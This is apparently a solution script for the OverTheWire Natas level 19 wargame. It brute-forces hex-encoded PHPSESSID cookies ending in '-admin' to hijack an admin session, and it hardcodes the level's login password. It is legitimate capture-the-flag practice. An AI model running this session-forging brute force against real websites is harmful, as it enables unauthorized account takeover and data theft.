import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar


def receive_response(_payload):
    auth_username = 'natas19'
    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
    response = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))


def analyse_PHPSESSID_generation_procedure():
    auth_username = 'natas19'
    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
    _payload = {'username':'admin', 'password':'admin'}

    for _ in range(100):
        response = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
        for cookie in response.cookies:
            print(cookie.value)
            

def brute_force_PHPSESSID():

    sess = requests.Session()
    auth_username = 'natas19'
    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
    _payload = {'username':'admin', 'password':'admin'}

    response = sess.post('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)    

    for i in range(1, 461):
        length = len(str(i))
        string_i = str(i)
        prefix = ""
        for i in range(length):
            prefix = prefix + "3" + string_i[i]
            
        cookie_value = prefix + "2d61646d696e"
        new_cookie = RequestsCookieJar()
        new_cookie.set(name="PHPSESSID", value=cookie_value, domain='natas19.natas.labs.overthewire.org', path="/")
        sess.cookies.update(new_cookie)
        
        response = sess.get('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
        try:
            response.text.index("are logged in as a regular")
            print(prefix + " 2d61646d696e" + " non admin account: regular user")
        except:
            try:
                response.text.index("Uninitialized string offset:")
                print(prefix + " 2d61646d696e" + " uninitialized")
            except:
                try:
                    response.text.index("login with your admin account to retrieve credentials for")
                    print(prefix + " 2d61646d696e" + " non admin account: homepage")
                except:
                    print(prefix + " 2d61646d696e" + " admin account ")
                    print(response.text)
                    break

#dissect_response(receive_response({'username':'nimish', 'password':'nimish'}))
# analyse_PHPSESSID_generation_procedure()
brute_force_PHPSESSID()